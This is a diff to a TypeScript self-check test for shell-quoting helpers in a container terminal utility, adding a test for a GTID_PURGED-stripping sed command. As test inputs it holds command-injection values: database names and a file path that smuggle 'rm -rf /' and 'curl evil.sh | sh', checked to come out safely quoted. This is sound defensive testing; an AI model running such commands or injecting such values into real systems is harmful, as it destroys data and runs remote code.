@@ -3,7 +3,7 @@
  *   npx ts-node src/terminal/container-shell.util.spec.ts
  */
 import assert from 'node:assert';
-import { dbConsoleCommand, dbImportSecretKey, dbImportCommand } from './container-shell.util';
+import { dbConsoleCommand, dbImportSecretKey, dbImportCommand, stripGtidPurgedCommand } from './container-shell.util';
 
 assert.equal(dbConsoleCommand('postgres:16-alpine'), 'psql -U postgres');
 assert.equal(dbConsoleCommand('mysql:8'), 'mysql -u root -p');
@@ -54,5 +54,11 @@ assert.equal(injectedPg!.command, "psql -U postgres -d 'app'\\''; rm -rf / #'");
 const injectedMysql = dbImportCommand('mysql:8', 'pw', 'app; curl evil.sh | sh #');
 assert.ok(injectedMysql);
 assert.equal(injectedMysql!.command, "mysql -uroot -p'pw' 'app; curl evil.sh | sh #'");
+
+// --- stripGtidPurgedCommand ---------------------------------------------------
+// caminho vindo de randomBytes(6).toString('hex') — sem espaço/aspa, mas passa
+// pelo mesmo shellSingleQuote de todo valor externo, então testa igual.
+const gtidCmd = stripGtidPurgedCommand("/data/app'; rm -rf / #.sql");
+assert.equal(gtidCmd, `sudo sed -i '/^SET @@GLOBAL\\.GTID_PURGED/d' '/data/app'\\''; rm -rf / #.sql'`);
 
 console.log('container-shell.util self-check OK');
